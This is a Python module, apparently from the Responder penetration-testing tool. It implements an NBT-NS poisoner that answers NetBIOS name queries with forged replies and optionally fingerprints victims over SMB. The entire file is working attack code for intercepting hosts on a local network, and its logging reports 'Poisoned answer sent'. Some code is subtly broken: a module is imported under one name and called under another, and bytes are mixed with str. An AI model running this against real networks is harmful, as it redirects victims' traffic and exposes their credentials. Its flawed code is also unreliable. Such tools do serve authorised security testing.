#!/usr/bin/env python
# This file is part of Responder
# Original work by Laurent Gaffie - Trustwave Holdings
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.

import core.responder.fingerprint

from core.responder.packets import NBT_Ans
from socketserver import BaseRequestHandler
from core.responder import utils
from core.responder import responder_settings

# Define what are we answering to.
def Validate_NBT_NS(data):
    if responder_settings.Config.AnalyzeMode:
        return False
    elif utils.NBT_NS_Role(data[43:46]) == "File Server":
        return True
    elif responder_settings.Config.NBTNSDomain:
        if utils.NBT_NS_Role(data[43:46]) == "Domain Controller":
            return True
    elif responder_settings.Config.Wredirect:
        if utils.NBT_NS_Role(data[43:46]) == "Workstation/Redirector":
            return True
    return False

# NBT_NS Server class.
class NBTNS(BaseRequestHandler):

    def handle(self):

        data, socket = self.request
        Name = utils.Decode_Name(data[13:45])

        # Break out if we don't want to respond to this host
        if utils.RespondToThisHost(self.client_address[0], Name) is not True:
            return None

        if data[2:4] == "\x01\x10":
            Finger = None
            if responder_settings.Config.Finger_On_Off:
                Finger = fingerprint.RunSmbFinger((self.client_address[0],445))

            if responder_settings.Config.AnalyzeMode:  # Analyze Mode
                LineHeader = "[Analyze mode: NBT-NS]"
                print(utils.color("%s Request by %s for %s, ignoring" % (LineHeader, self.client_address[0], Name), 2, 1))
            else:  # Poisoning Mode
                Buffer = NBT_Ans()
                Buffer.calculate(data)
                socket.sendto(str(Buffer), self.client_address)
                LineHeader = "[*] [NBT-NS]"

                print(utils.color("%s Poisoned answer sent to %s for name %s (service: %s)" % (LineHeader, self.client_address[0], Name, utils.NBT_NS_Role(data[43:46])), 2, 1))

            if Finger is not None:
                print(utils.text("[FINGER] OS Version     : %s" % utils.color(Finger[0], 3)))
                print(utils.text("[FINGER] Client Version : %s" % utils.color(Finger[1], 3)))
